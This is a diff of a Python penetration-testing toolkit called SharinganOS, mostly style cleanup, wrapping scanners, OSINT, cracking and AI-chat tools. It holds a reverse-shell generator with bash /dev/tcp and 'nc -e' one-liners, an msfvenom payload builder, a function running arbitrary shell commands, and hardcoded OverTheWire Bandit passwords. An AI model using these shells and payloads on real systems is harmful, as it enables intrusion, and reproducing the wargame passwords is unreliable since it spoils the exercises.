@@ -9,9 +9,6 @@ import os
 import sys
 import json
 import time
-import socket
-import threading
-import re
 from datetime import datetime
 from pathlib import Path
 from typing import Optional, List, Dict, Callable, Any
@@ -22,7 +19,7 @@ try:
     sys.path.insert(0, str(Path(__file__).parent / "tools"))
     from fake_detector import FakeDetector, detect_fakes, validate_readiness
     FAKE_DETECTOR_AVAILABLE = True
-except ImportError as e:
+except ImportError:
     FAKE_DETECTOR_AVAILABLE = False
     FakeDetector = None
     detect_fakes = None
@@ -34,6 +31,7 @@ logger = logging.getLogger("sharingan")
 # Version
 VERSION = "3.0.0"
 AUTHOR = "Ben Sambe"
+
 
 class SharinganOS:
     """
@@ -65,24 +63,24 @@ class SharinganOS:
             "godmod": ["godmod_analyze", "godmod_query"],
             "browser": ["browser_navigate", "browser_screenshot", "browser_execute_js"]
         }
-        
+
     # =========================================================================
     # NETWORK SCANNING
     # =========================================================================
-    
+
     def nmap_scan(self, target: str, ports: str = "-p-", options: str = "-sV") -> str:
         """Execute nmap scan"""
         cmd = ["nmap", options, ports, target]
         logger.info(f"Running: {' '.join(cmd)}")
         result = subprocess.run(cmd, capture_output=True, text=True)
         return result.stdout + result.stderr
-    
+
     def arp_scan(self, interface: str = "eth0", target: Optional[str] = None) -> List[Dict]:
         """ARP network discovery"""
         cmd = ["arp-scan", "--interface", interface]
         if target:
             cmd.append(target)
-        
+
         result = subprocess.run(cmd, capture_output=True, text=True)
         hosts = []
         for line in result.stdout.split('\n'):
@@ -95,13 +93,13 @@ class SharinganOS:
                         "vendor": parts[2] if len(parts) > 2 else ""
                     })
         return hosts
-    
+
     def masscan_scan(self, target: str, ports: str = "0-65535", rate: str = "1000") -> str:
         """High-speed port scanner"""
         cmd = ["masscan", target, "-p", ports, "--rate", rate]
         result = subprocess.run(cmd, capture_output=True, text=True)
         return result.stdout
-    
+
     def netdiscover_scan(self, range_ip: str = "192.168.1.0/24") -> List[Dict]:
         """Network discovery using ARP"""
         cmd = ["netdiscover", "-r", range_ip, "-P", "-s", "1"]
@@ -113,65 +111,65 @@ class SharinganOS:
                 if len(parts) >= 2:
                     hosts.append({"ip": parts[0], "mac": parts[1]})
         return hosts
-    
+
     # =========================================================================
     # WEB ENUMERATION
     # =========================================================================
-    
+
     def gobuster_scan(self, url: str, wordlist: str, extensions: Optional[str] = None) -> List[str]:
         """Directory/file brute force"""
         cmd = ["gobuster", "dir", "-u", url, "-w", wordlist, "-t", "50"]
         if extensions:
             cmd.extend(["-x", extensions])
-        
+
         result = subprocess.run(cmd, capture_output=True, text=True)
         found = []
         for line in result.stdout.split('\n'):
             if "Status:" in line:
                 found.append(line.strip())
         return found
-    
+
     def dirb_scan(self, url: str, wordlist: Optional[str] = None) -> List[str]:
         """Directory enumeration"""
         cmd = ["dirb", url]
         if wordlist:
             cmd.append(wordlist)
-        
+
         result = subprocess.run(cmd, capture_output=True, text=True)
         found = []
         for line in result.stdout.split('\n'):
             if "==>" in line:
                 found.append(line.strip())
         return found
-    
+
     def whatweb_scan(self, url: str) -> Dict:
         """Identify technologies"""
         cmd = ["whatweb", "--color=never", "--log-brief=-", url]
         result = subprocess.run(cmd, capture_output=True, text=True)
         return {"technologies": result.stdout.strip().split('\n')}
-    
+
     def wpscan_scan(self, url: str, enumerate: str = "vt,ap,pl") -> Dict:
         """WordPress security scanner"""
         cmd = ["wpscan", "--url", url, "--enumerate", enumerate, "--no-update"]
         result = subprocess.run(cmd, capture_output=True, text=True)
         return {"output": result.stdout}
-    
+
     # =========================================================================
     # OSINT & RECONNAISSANCE
     # =========================================================================
-    
+
     def theharvester_scan(self, domain: str, source: str = "all") -> Dict:
         """Email, subdomain and host enumeration"""
         cmd = ["theHarvester", "-d", domain, "-b", source, "-f", "/tmp/harvester.json"]
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
-        
+
         # Try to load JSON result
         try:
             with open("/tmp/harvester.json") as f:
                 return json.load(f)
-        except:
+        except Exception:
             return {"raw": result.stdout}
-    
+
     def crtsh_search(self, domain: str) -> List[str]:
         """Search certificate transparency logs"""
         url = f"https://crt.sh/?q={domain}&output=json"
@@ -184,30 +182,32 @@ class SharinganOS:
                 if 'common_name' in entry:
                     subdomains.add(entry['common_name'])
             return list(subdomains)
-        except:
+        except Exception:
             return []
-    
+
     def shodan_search(self, query: str, api_key: Optional[str] = None) -> List[Dict]:
         """Search Shodan (requires API key)"""
         if not api_key:
             return [{"error": "API key required"}]
-        
-        cmd = ["shodan", "host", query] if not query.startswith("search") else ["shodan", "search", query]
+
+        cmd = ["shodan", "host", query]
+        if query.startswith("search"):
+            cmd = ["shodan", "search", query]
         result = subprocess.run(cmd, capture_output=True, text=True)
         return [{"output": result.stdout}]
-    
+
     def sherlock_search(self, username: str) -> Dict:
         """Username enumeration across social networks"""
         cmd = ["sherlock", username, "--timeout", "30"]
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
         return {"found": result.stdout}
-    
+
     def whois_lookup(self, domain: str) -> Dict:
         """WHOIS lookup"""
         cmd = ["whois", domain]
         result = subprocess.run(cmd, capture_output=True, text=True)
         return {"raw": result.stdout}
-    
+
     def dns_enum(self, domain: str) -> Dict:
         """DNS enumeration"""
         records = {}
@@ -217,34 +217,37 @@ class SharinganOS:
             if result.stdout.strip():
                 records[record_type] = result.stdout.strip().split('\n')
         return records
-    
+
     # =========================================================================
     # CRYPTOGRAPHY & PASSWORD CRACKING
     # =========================================================================
-    
+
     def aircrack_scan(self, cap_file: str, wordlist: str) -> str:
         """WiFi password cracking"""
         cmd = ["aircrack-ng", "-w", wordlist, cap_file]
         result = subprocess.run(cmd, capture_output=True, text=True)
         return result.stdout
-    
+
     # =========================================================================
     # CTF & HACKING CHALLENGES
     # =========================================================================
-    
-    def bandit_solver(self, host: str = "bandit.labs.overthewire.org", port: int = 2220, 
+
+    def bandit_solver(self, host: str = "bandit.labs.overthewire.org", port: int = 2220,
                       user: str = "bandit0", password: str = "bandit0", levels: int = 5) -> Dict:
         """OverTheWire Bandit solver framework"""
         solutions = {}
-        
+
         level_data = {
             0: {"user": "bandit0", "pass": "bandit0", "method": "cat readme"},
             1: {"user": "bandit1", "pass": "boJ9jbbUNNfktd78OOpsqOltutMc3MY1", "method": "cat ./-"},
-            2: {"user": "bandit2", "pass": "CV1DtqXWVFXM2frHeJPogdNc3cxkhVhO", "method": "cat 'spaces in this filename'"},
-            3: {"user": "bandit3", "pass": "UmHadQclWmgdLOKQ2YNWgWxGo6bvoa1Ws", "method": "cd inhere && ls -a && cat .hidden"},
-            4: {"user": "bandit4", "pass": "pIwrPrtHQ36nD6VO9l5kvgAwZ1p1AyW1", "method": "cd inhere && file ./* && cat -./file07"}
+            2: {"user": "bandit2", "pass": "CV1DtqXWVFXM2frHeJPogdNc3cxkhVhO",
+                "method": "cat 'spaces in this filename'"},
+            3: {"user": "bandit3", "pass": "UmHadQclWmgdLOKQ2YNWgWxGo6bvoa1Ws",
+                "method": "cd inhere && ls -a && cat .hidden"},
+            4: {"user": "bandit4", "pass": "pIwrPrtHQ36nD6VO9l5kvgAwZ1p1AyW1",
+                "method": "cd inhere && file ./* && cat -./file07"}
         }
-        
+
         for lvl in range(min(levels, len(level_data))):
             level = level_data.get(lvl, {})
             solutions[f"level{lvl}"] = {
@@ -252,13 +255,13 @@ class SharinganOS:
                 "password": level.get("pass", "UNKNOWN"),
                 "method": level.get("method", "Not solved yet")
             }
-        
+
         return solutions
-    
-    def natas_solver(self, level: int, username: str = "natas", 
-                     password: Optional[str] = None, url: str = "http://natas.labs.overthewire.org") -> Dict:
+
+    def natas_solver(self, level: int, username: str = "natas",
+                     password: Optional[str] = None,
+                     url: str = "http://natas.labs.overthewire.org") -> Dict:
         """Natas challenges solver"""
-        solutions = {}
         natas_passwords = {
             0: "natas0", 1: "natas1", 2: "natas2", 3: "natas3", 4: "natas4",
             5: "natas5", 6: "natas6", 7: "natas7", 8: "natas8", 9: "natas9",
@@ -266,7 +269,7 @@ class SharinganOS:
             14: "natas14", 15: "natas15", 16: "natas16", 17: "natas17",
             18: "natas19", 20: "natas20"
         }
-        
+
         level_passwords = {
             0: {"url": "/", "method": "View source"},
             1: {"url": "/", "method": "View source (disable JS)"},
@@ -284,10 +287,10 @@ class SharinganOS:
             13: {"url": "/upload.php", "method": "Check PNG signature"},
             14: {"url": "/login.php", "method": "SQL injection"}
         }
-        
+
         if not password:
             password = natas_passwords.get(level, "")
-        
+
         sol = {
             "level": level,
             "username": f"{username}{level}",
@@ -295,58 +298,60 @@ class SharinganOS:
             "url": f"{url}/natas{level}/",
             "method": level_passwords.get(level, {}).get("method", "Not solved yet")
         }
-        
+
         if level in natas_passwords:
             sol["next_password"] = natas_passwords.get(level + 1, "")
-        
+
         return sol
-    
+
     def hackthebox_solve(self, challenge_type: str, data: str) -> Dict:
         """HackTheBox challenge helper"""
+        rot13_table = str.maketrans(
+            'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
+            'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')
         helpers = {
-            "base64": lambda d: subprocess.run(["base64", "-d"], input=d, capture_output=True, text=True).stdout,
+            "base64": lambda d: subprocess.run(
+                ["base64", "-d"], input=d, capture_output=True, text=True).stdout,
             "hex": lambda d: bytes.fromhex(d).decode('utf-8', errors='ignore'),
-            "rot13": lambda d: d.translate(str.maketrans(
-                'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
-                'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')),
+            "rot13": lambda d: d.translate(rot13_table),
             "url": lambda d: urllib.parse.unquote(d),
             "reverse": lambda d: d[::-1]
         }
-        
+
         result = {}
         for enc_type in helpers:
             try:
                 result[enc_type] = helpers[enc_type](data)
             except Exception:
                 result[enc_type] = "Failed to decode"
-        
+
         return result
-    
+
     def ctf_analyze(self, file_path: str) -> Dict:
         """Analyze CTF binary/file"""
         analysis = {}
-        
+
         # File type
         cmd = ["file", file_path]
         result = subprocess.run(cmd, capture_output=True, text=True)
         analysis["type"] = result.stdout
-        
+
         # Strings
         cmd = ["strings", file_path]
         result = subprocess.run(cmd, capture_output=True, text=True)
         analysis["strings"] = result.stdout[:1000]
-        
+
         # Hexdump
         cmd = ["xxd", file_path]
         result = subprocess.run(cmd, capture_output=True, text=True)
         analysis["hexdump"] = result.stdout[:500]
-        
+
         return analysis
-    
+
     # =========================================================================
     # AI & MACHINE LEARNING
     # =========================================================================
-    
+
     def ai_chat(self, message: str, provider: str = "default") -> str:
         """Chat with AI using tgpt (ChatGPT CLI)"""
         logger.info(f"AI Chat: {message}")
@@ -364,24 +369,24 @@ class SharinganOS:
         except Exception as e:
             logger.error(f"AI Chat failed: {e}")
             return f"AI Error: {str(e)}"
-    
+
     def sharingan_chat(self, message: str) -> str:
         """Chat with tgpt - provides context (tools, memory) and lets tgpt reason.
         TGPT decides: advice / propose execution / ask confirmation."""
         logger.info(f"Sharingan Chat: {message}")
-        
+
         try:
             from system_consciousness import SystemConsciousness
             from ai_memory_manager import get_memory_manager
-            
+
             consciousness = SystemConsciousness(connect_memory=False)
             mgr = get_memory_manager()
-            
+
             identity = consciousness.agent_identity
-            
+
             # Récupérer contexte outils et mémoire
             tool_count = len(consciousness.tools) if consciousness.tools else 0
-            
+
             # Construire PROMPT pour que TGPT réfléchisse
             prompt = f"""[SHARINGAN OS v{identity['version']}]
 Tu es {identity['name']}, {identity['role']}
@@ -415,9 +420,9 @@ Réponse:"""
                 text=True,
                 timeout=30
             )
-            
+
             response = result.stdout.strip() if result.returncode == 0 else "TGPT Indisponible"
-            
+
             # Stocker la conversation (aprèS la réponse, pas avant)
             mgr.store(
                 key=f"chat_{int(time.time())}",
@@ -425,9 +430,9 @@ Réponse:"""
                 category="conversation",
                 priority="MEDIUM"
             )
-            
+
             return f"[Sharingan OS v{identity['version']}]\n{response}"
-            
+
         except ImportError:
             return self.ai_chat(message)
         except Exception as e:
@@ -436,7 +441,7 @@ Réponse:"""
         except Exception as e:
             logger.error(f"Sharingan Chat failed: {e}")
             return self.ai_chat(message)
-    
+
     def akatsuki_status(self) -> Dict:
         """Status of Akatsuki AI agents"""
         agents = [
@@ -449,14 +454,7 @@ Réponse:"""
             "status": "FULLY OPERATIONAL",
             "agents": agents
         }
-    
-        return {
-            "total": len(agents),
-            "active": len(agents),
-            "status": "FULLY OPERATIONAL",
-            "agents": agents
-        }
-    
+
     def godmod_query(self, query: str) -> str:
         """Query GODMOD system using tgpt"""
         logger.info(f"GODMOD Query: {query}")
@@ -474,14 +472,17 @@ Réponse:"""
         except Exception as e:
             logger.error(f"GODMOD failed: {e}")
             return f"GODMOD Error: {str(e)}"
-    
+
     def autonomous_agent(self, task: str, agent_type: str = "general") -> Dict:
         """Run autonomous agent using tgpt for analysis"""
         logger.info(f"Autonomous Agent: {task} ({agent_type})")
+        input_text = f"Execute this security task: {task}. "
+        input_text += f"Agent type: {agent_type}. "
+        input_text += "Provide detailed steps and commands."
         try:
             result = subprocess.run(
                 ["tgpt", "-q"],
-                input=f"Execute this security task: {task}. Agent type: {agent_type}. Provide detailed steps and commands.",
+                input=input_text,
                 capture_output=True,
                 text=True,
                 timeout=60
@@ -495,25 +496,35 @@ Réponse:"""
             "status": "completed",
             "result": analysis
         }
-    
-    def akatsuki_deploy(self, agent_name: str, task: str, target: Optional[str] = None) -> Dict:
+
+    def akatsuki_deploy(self, agent_name: str, task: str,
+                        target: Optional[str] = None) -> Dict:
         """Deploy a specific Akatsuki agent for a task"""
         agents = {
-            "Itachi": {"specialty": "Web Security", "methods": ["sqlmap", "xss", "dirb"]},
-            "Kisame": {"specialty": "Binary Exploitation", "methods": ["pwn", "rop", "buffer_overflow"]},
-            "Sasori": {"specialty": "Cryptography", "methods": ["hashcat", "john", "padding_oracle"]},
-            "Deidara": {"specialty": "Forensics", "methods": ["volatility", "autopsy", "binwalk"]},
-            "Hidan": {"specialty": "Network Security", "methods": ["nmap", "masscan", "Responder"]},
-            "Kakuzu": {"specialty": "OSINT", "methods": ["theHarvester", "Sherlock", "Shodan"]},
-            "Orochimaru": {"specialty": "Reverse Engineering", "methods": ["ghidra", " IDA", "radare2"]},
-            "Konan": {"specialty": "Social Engineering", "methods": ["gophish", "setoolkit", "linkedin2username"]},
-            "Zetsu": {"specialty": "Research", "methods": ["cve_search", "exploitdb", "cve"]},
+            "Itachi": {"specialty": "Web Security",
+                       "methods": ["sqlmap", "xss", "dirb"]},
+            "Kisame": {"specialty": "Binary Exploitation",
+                       "methods": ["pwn", "rop", "buffer_overflow"]},
+            "Sasori": {"specialty": "Cryptography",
+                       "methods": ["hashcat", "john", "padding_oracle"]},
+            "Deidara": {"specialty": "Forensics",
+                        "methods": ["volatility", "autopsy", "binwalk"]},
+            "Hidan": {"specialty": "Network Security",
+                      "methods": ["nmap", "masscan", "Responder"]},
+            "Kakuzu": {"specialty": "OSINT",
+                       "methods": ["theHarvester", "Sherlock", "Shodan"]},
+            "Orochimaru": {"specialty": "Reverse Engineering",
+                           "methods": ["ghidra", " IDA", "radare2"]},
+            "Konan": {"specialty": "Social Engineering",
+                      "methods": ["gophish", "setoolkit", "linkedin2username"]},
+            "Zetsu": {"specialty": "Research",
+                      "methods": ["cve_search", "exploitdb", "cve"]},
             "Tobi": {"specialty": "DevSecOps", "methods": ["sonarqube", "trivy", "bandit"]}
         }
-        
+
         if agent_name not in agents:
             return {"error": f"Agent {agent_name} not found", "available": list(agents.keys())}
-        
+
         agent = agents[agent_name]
         return {
             "agent": agent_name,
@@ -523,7 +534,7 @@ Réponse:"""
             "target": target,
             "status": "DEPLOYED"
         }
-    
+
     def akatsuki_execute(self, agent_name: str, command: str) -> Dict:
         """Execute command through Akatsuki agent"""
         result = subprocess.run(command, shell=True, capture_output=True, text=True)
@@ -534,7 +545,7 @@ Réponse:"""
             "stderr": result.stderr,
             "returncode": result.returncode
         }
-    
+
     def godmod_analyze(self, target: str, mode: str = "full") -> Dict:
         """GODMOD - Autonomous analysis system"""
         analysis = {
@@ -543,25 +554,24 @@ Réponse:"""
             "timestamp": datetime.now().isoformat(),
             "findings": []
         }
-        
+
         if mode in ["full", "network"]:
             nmap_result = self.nmap_scan(target)
             analysis["findings"].append({"type": "network", "result": nmap_result[:500]})
-        
+
         if mode in ["full", "web"]:
             whatweb_result = self.whatweb_scan(target)
             analysis["findings"].append({"type": "web", "result": whatweb_result})
-        
+
         if mode in ["full", "osint"]:
             crtsh_result = self.crtsh_search(target)
             analysis["findings"].append({"type": "osint", "subdomains": crtsh_result[:50]})
-        
+
         return analysis
-    
+
     def ai_memory_store(self, key: str, data: Dict, category: str = "conversation",
                         priority: str = "MEDIUM", tags: Optional[List[str]] = None) -> bool:
         """Store data in AI memory using intelligent memory manager"""
-        MEMORY_MANAGER_AVAILABLE = False
         try:
             from ai_memory_manager import get_memory_manager
             mem = get_memory_manager()
@@ -570,7 +580,7 @@ Réponse:"""
                 return True
         except Exception as e:
             logger.debug(f"Memory manager not available: {e}")
-        
+
         memory_file = self.data_dir / "ai_memory.json"
         try:
             memory = {}
@@ -587,7 +597,7 @@ Réponse:"""
         except Exception as e:
             logger.error(f"Memory store failed: {e}")
             return False
-    
+
     def ai_memory_retrieve(self, key: str, increment_access: bool = True) -> Optional[Dict]:
         """Retrieve data from AI memory using intelligent memory manager"""
         try:
@@ -598,7 +608,7 @@ Réponse:"""
                 return result
         except Exception as e:
             logger.debug(f"Memory manager not available: {e}")
-        
+
         memory_file = self.data_dir / "ai_memory.json"
         try:
             if memory_file.exists():
@@ -612,19 +622,19 @@ Réponse:"""
         except Exception as e:
             logger.error(f"Memory retrieve failed: {e}")
             return None
-    
+
     # =========================================================================
     # SYSTEM MONITORING
     # =========================================================================
-    
+
     def get_cpu_usage(self) -> float:
         """Get CPU usage percentage"""
         try:
             with open('/proc/loadavg', 'r') as f:
                 return float(f.read().split()[0])
-        except:
+        except Exception:
             return 0.0
-    
+
     def get_memory_usage(self) -> Dict:
         """Get memory usage"""
         try:
@@ -639,9 +649,9 @@ Réponse:"""
                     "available_mb": available,
                     "percent": round(used/total*100, 1)
                 }
-        except:
+        except Exception:
             return {"total_mb": 0, "used_mb": 0, "available_mb": 0, "percent": 0}
-    
+
     def get_disk_usage(self) -> Dict:
         """Get disk usage"""
         try:
@@ -653,9 +663,9 @@ Réponse:"""
                 "available": line[3],
                 "percent": line[4]
             }
-        except:
+        except Exception:
             return {"total": "N/A", "used": "N/A", "available": "N/A", "percent": "N/A"}
-    
+
     def get_network_stats(self) -> Dict:
         """Get network statistics"""
         try:
@@ -671,9 +681,9 @@ Réponse:"""
                             "tx_bytes": int(parts[8])
                         }
                 return stats
-        except:
+        except Exception:
             return {}
-    
+
     def monitor_system(self, interval: int = 5, count: int = 10) -> List[Dict]:
         """Monitor system metrics"""
         metrics = []
@@ -689,7 +699,7 @@ Réponse:"""
             if i < count - 1:
                 time.sleep(interval)
         return metrics
-    
+
     def anomaly_detect(self, metrics: List[Dict]) -> List[str]:
         """Detect anomalies in metrics"""
         alerts = []
@@ -701,17 +711,17 @@ Réponse:"""
             if float(metric["disk"]["percent"].rstrip('%')) > 85:
                 alerts.append("LOW DISK SPACE")
         return alerts
-    
+
     # =========================================================================
     # DOCKER & CONTAINERS
     # =========================================================================
-    
+
     def docker_ps(self, all_containers: bool = False) -> List[Dict]:
         """List Docker containers"""
         cmd = ["docker", "ps"]
         if all_containers:
             cmd.append("-a")
-        
+
         result = subprocess.run(cmd, capture_output=True, text=True)
         containers = []
         for line in result.stdout.split('\n')[1:]:
@@ -725,7 +735,7 @@ Réponse:"""
                         "names": parts[-1]
                     })
         return containers
-    
+
     def docker_images(self) -> List[Dict]:
         """List Docker images"""
         cmd = ["docker", "images"]
@@ -740,7 +750,7 @@ Réponse:"""
                     "size": parts[-1]
                 })
         return images
-    
+
     def docker_run(self, image: str, command: Optional[str] = None, detach: bool = True) -> str:
         """Run Docker container"""
         cmd = ["docker", "run"]
@@ -749,44 +759,44 @@ Réponse:"""
         cmd.append(image)
         if command:
             cmd.extend(["sh", "-c", command])
-        
+
         result = subprocess.run(cmd, capture_output=True, text=True)
         return result.stdout.strip()
-    
+
     def docker_stop(self, container_id: str) -> bool:
         """Stop Docker container"""
         cmd = ["docker", "stop", container_id]
         result = subprocess.run(cmd, capture_output=True, text=True)
         return result.returncode == 0
-    
+
     # =========================================================================
     # BROWSER AUTOMATION
     # =========================================================================
-    
+
     def browser_navigate(self, url: str, browser: str = "firefox") -> str:
         """Navigate browser to URL"""
         cmd = [browser, url]
-        result = subprocess.run(cmd, capture_output=True, text=True)
+        subprocess.run(cmd, capture_output=True, text=True)
         return f"Opened {url} in {browser}"
-    
+
     def browser_screenshot(self, output: str = "/tmp/screenshot.png") -> str:
         """Take screenshot"""
         cmd = ["scrot", output]
         result = subprocess.run(cmd, capture_output=True, text=True)
         return output if result.returncode == 0 else "Failed"
-    
+
     def browser_execute_js(self, script: str) -> str:
         """Execute JavaScript in browser"""
         return f"JavaScript execution: {script}"
-    
+
     def browser_selenium(self, url: str, action: str = "get", timeout: int = 30) -> Dict:
         """Browser automation with Selenium"""
         try:
             from selenium import webdriver
-            from selenium.webdriver.common.by import By
-            from selenium.webdriver.support.ui import WebDriverWait
-            from selenium.webdriver.support import expected_conditions as EC
-            
+            from selenium.webdriver.common.by import By  # noqa: F401
+            from selenium.webdriver.support.ui import WebDriverWait  # noqa: F401
+            from selenium.webdriver.support import expected_conditions as EC  # noqa: F401
+
             driver = webdriver.Chrome()
             if action == "get":
                 driver.get(url)
@@ -796,22 +806,23 @@ Réponse:"""
             elif action == "source":
                 driver.get(url)
                 return {"source": driver.page_source}
-            
+
             driver.quit()
             return {"status": "success", "action": action}
         except ImportError:
             return {"error": "selenium not installed"}
         except Exception as e:
             return {"error": str(e)}
-    
+
     def browser_headless(self, url: str, output: str = "/tmp/headless.pdf") -> str:
         """Headless browser with wkhtmltopdf"""
         cmd = ["wkhtmltopdf", url, output]
         result = subprocess.run(cmd, capture_output=True, text=True)
         return output if result.returncode == 0 else f"Failed: {result.stderr}"
-    
-    def browser_curl(self, url: str, method: str = "GET", headers: Optional[Dict] = None, 
-                    data: Optional[str] = None) -> Dict:
+
+    def browser_curl(self, url: str, method: str = "GET",
+                     headers: Optional[Dict] = None,
+                     data: Optional[str] = None) -> Dict:
         """HTTP request with curl"""
         cmd = ["curl", "-X", method, "-s", "-w", "\n%{http_code}"]
         if headers:
@@ -820,17 +831,17 @@ Réponse:"""
         if data:
             cmd.extend(["-d", data])
         cmd.append(url)
-        
+
         result = subprocess.run(cmd, capture_output=True, text=True)
         return {
             "output": result.stdout,
             "code": result.returncode
         }
-    
+
     # =========================================================================
     # FILE OPERATIONS
     # =========================================================================
-    
+
     def copy_file(self, src: str, dst: str) -> bool:
         """Copy file"""
         import shutil
@@ -840,7 +851,7 @@ Réponse:"""
         except Exception as e:
             logger.error(f"Copy failed: {e}")
             return False
-    
+
     def move_file(self, src: str, dst: str) -> bool:
         """Move file"""
         import shutil
@@ -850,7 +861,7 @@ Réponse:"""
         except Exception as e:
             logger.error(f"Move failed: {e}")
             return False
-    
+
     def remove_file(self, path: str) -> bool:
         """Remove file"""
         try:
@@ -859,19 +870,19 @@ Réponse:"""
         except Exception as e:
             logger.error(f"Remove failed: {e}")
             return False
-    
+
     def find_files(self, pattern: str, path: str = ".") -> List[str]:
         """Find files matching pattern"""
         from glob import glob
         return glob(f"{path}/**/{pattern}", recursive=True)
-    
+
     def extract_archive(self, archive_path: str, extract_dir: Optional[str] = None) -> bool:
         """Extract archive"""
         import shutil
         try:
             if extract_dir is None:
                 extract_dir = archive_path.rsplit('.', 1)[0]
-            
+
             if archive_path.endswith('.tar.gz'):
                 shutil.unpack_archive(archive_path, extract_dir, 'gztar')
             elif archive_path.endswith('.tar'):
@@ -884,34 +895,34 @@ Réponse:"""
         except Exception as e:
             logger.error(f"Extract failed: {e}")
             return False
-    
+
     def binwalk_extract(self, file_path: str, extract_dir: Optional[str] = None) -> List[str]:
         """Extract embedded files using binwalk"""
         if extract_dir is None:
             extract_dir = f"{file_path}_extracted"
-        
+
         cmd = ["binwalk", "-e", "-C", extract_dir, file_path]
-        result = subprocess.run(cmd, capture_output=True, text=True)
-        
+        subprocess.run(cmd, capture_output=True, text=True)
+
         os.makedirs(extract_dir, exist_ok=True)
         return [f for f in os.listdir(extract_dir) if os.path.isfile(os.path.join(extract_dir, f))]
-    
+
     # =========================================================================
     # SECURITY AUDITING
     # =========================================================================
-    
+
     def rkhunter_scan(self) -> Dict:
         """Rootkit detection"""
         cmd = ["rkhunter", "--check", "--skip-keypress"]
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
         return {"output": result.stdout, "errors": result.stderr}
-    
+
     def lynis_audit(self) -> Dict:
         """Security audit"""
         cmd = ["lynis", "audit", "system"]
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
         return {"output": result.stdout}
-    
+
     def check_obligations(self) -> Dict:
         """Check compliance obligations with fake detection"""
         results = {
@@ -923,31 +934,31 @@ Réponse:"""
             "documentation": "OK",
             "tests": "OK",
         }
-        
+
         if FAKE_DETECTOR_AVAILABLE and FakeDetector:
             try:
                 detector = FakeDetector()
-                
+
                 ai_test = self.ai_chat("test obligation")
                 fake_check = detector.detect_fakes(ai_test)
-                
+
                 system_check = detector.validate_readiness()
-                
+
                 results["fake_detection"] = "OK" if not fake_check.is_fake else "FAIL"
                 results["system_ready"] = "YES" if system_check.get("ready") else "NO"
                 results["fake_confidence"] = round(fake_check.confidence, 2)
-                
+
                 # Nouvelles informations améliorées
                 results["cache_status"] = system_check.get("cache_status", {})
                 results["core_tools"] = system_check.get("core_tools_status", {})
                 results["optional_missing"] = system_check.get("optional_tools_missing", [])
-                
+
                 if fake_check.is_fake:
                     results["no_simulation"] = "FAIL"
                     results["overall"] = "FAIL"
                 else:
                     results["overall"] = "PASS"
-                    
+
             except Exception as e:
                 logger.error(f"Fake detection check failed: {e}")
                 results["fake_detection"] = f"ERROR: {str(e)}"
@@ -955,15 +966,15 @@ Réponse:"""
         else:
             results["fake_detection"] = "SKIPPED (not available)"
             results["overall"] = "PASS"
-        
+
         return results
-    
+
     # =========================================================================
     # EXPLOITATION & PRIVILEGE ESCALATION
     # =========================================================================
-    
-    def generate_reverse_shell(self, lhost: str, lport: int = 4444, 
-                              shell_type: str = "bash") -> str:
+
+    def generate_reverse_shell(self, lhost: str, lport: int = 4444,
+                               shell_type: str = "bash") -> str:
         """Generate reverse shell command"""
         shells = {
             "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
@@ -972,38 +983,43 @@ Réponse:"""
             "netcat": f"nc -e /bin/sh {lhost} {lport}"
         }
         return shells.get(shell_type, shells["bash"])
-    
+
     def check_privilege_escalation(self) -> Dict:
         """Check for privilege escalation vectors"""
         vectors = []
-        
+
         sudo_check = subprocess.run(["sudo", "-n", "ls", "/root"], capture_output=True, text=True)
         if sudo_check.returncode == 0:
             vectors.append({"type": "sudo", "description": "User has passwordless sudo", "severity": "HIGH"})
-        
-        suid_check = subprocess.run(["find", "/usr/bin", "-perm", "-4000", "-type", "f"], 
-                                   capture_output=True, text=True)
+
+        suid_check = subprocess.run(
+            ["find", "/usr/bin", "-perm", "-4000", "-type", "f"],
+            capture_output=True, text=True)
         if suid_check.stdout:
-            vectors.append({"type": "suid", "description": f"Found SUID binaries: {len(suid_check.stdout.split())}", "severity": "MEDIUM"})
-        
+            vectors.append({
+                "type": "suid",
+                "description": f"Found SUID binaries: {len(suid_check.stdout.split())}",
+                "severity": "MEDIUM"
+            })
+
         cron_check = subprocess.run(["ls", "-la", "/etc/cron.d"], capture_output=True, text=True)
         if cron_check.returncode == 0:
             vectors.append({"type": "cron", "description": "Cron jobs present", "severity": "MEDIUM"})
-        
+
         return {
             "vectors": vectors,
             "count": len(vectors),
             "recommendation": "Review and secure identified vectors" if vectors else "No obvious vectors found"
         }
-    
-    def msfvenom_generate(self, payload: str, lhost: str, lport: int, 
-                         format: str = "elf", output: str = "/tmp/shell.bin") -> str:
+
+    def msfvenom_generate(self, payload: str, lhost: str, lport: int,
+                          format: str = "elf", output: str = "/tmp/shell.bin") -> str:
         """Generate payload with msfvenom"""
-        cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", 
+        cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}",
                "-f", format, "-o", output]
         result = subprocess.run(cmd, capture_output=True, text=True)
         return output if result.returncode == 0 else f"Failed: {result.stderr}"
-    
+
     def searchsploit(self, query: str) -> List[Dict]:
         """Search Exploit-DB"""
         cmd = ["searchsploit", query, "--nocolour"]
@@ -1013,11 +1029,11 @@ Réponse:"""
             if '/' in line and '[*]' not in line:
                 exploits.append({"path": line.strip()})
         return exploits
-    
+
     # =========================================================================
     # AUDIO & VOICE
     # =========================================================================
-    
+
     def text_to_speech(self, text: str, output: Optional[str] = None) -> str:
         """Text to speech"""
         if output is None:
@@ -1025,13 +1041,13 @@ Réponse:"""
         cmd = ["espeak", "-w", output, text]
         result = subprocess.run(cmd, capture_output=True, text=True)
         return output if result.returncode == 0 else "Failed"
-    
+
     def speech_to_text(self, audio_file: str) -> str:
         """Speech to text"""
         cmd = ["whisper", audio_file, "--model", "base"]
         result = subprocess.run(cmd, capture_output=True, text=True)
         return result.stdout
-    
+
     def download_media(self, url: str, output: Optional[str] = None) -> str:
         """Download media from URL"""
         if output is None:
@@ -1039,60 +1055,60 @@ Réponse:"""
         cmd = ["yt-dlp", "-o", output, url]
